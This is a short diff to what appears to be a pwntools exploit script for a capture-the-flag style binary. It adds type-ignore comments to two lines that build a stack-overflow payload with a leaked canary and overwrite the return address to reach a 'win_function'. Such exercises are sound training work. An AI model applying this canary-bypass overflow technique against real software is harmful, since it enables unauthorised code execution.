@@ -112,7 +112,7 @@ if __name__ == "__main__":
         tmp_canary = int.from_bytes(tmp_canary, "little")
         
         # Generate the payload
-        payload = b"A" * canary_offset + p64(tmp_canary)
+        payload = b"A" * canary_offset + p64(tmp_canary) # type: ignore
 
         # Send the payload
         p.sendlineafter(b"3. Exit\n", b"2")
@@ -132,7 +132,7 @@ if __name__ == "__main__":
     # Inject payload with the correct canary
     # This time we also add 8 characters because it is the distance between the canary and the return instruction of the main function
     final_canary_int = int.from_bytes(final_canary, "little")
-    payload = b"A" * canary_offset + p64(final_canary_int) + b"B" * 8 + p64(win_function)
+    payload = b"A" * canary_offset + p64(final_canary_int) + b"B" * 8 + p64(win_function) # type: ignore
 
     p.sendline(payload)
     p.sendlineafter(b"3. Exit\n", b"3")
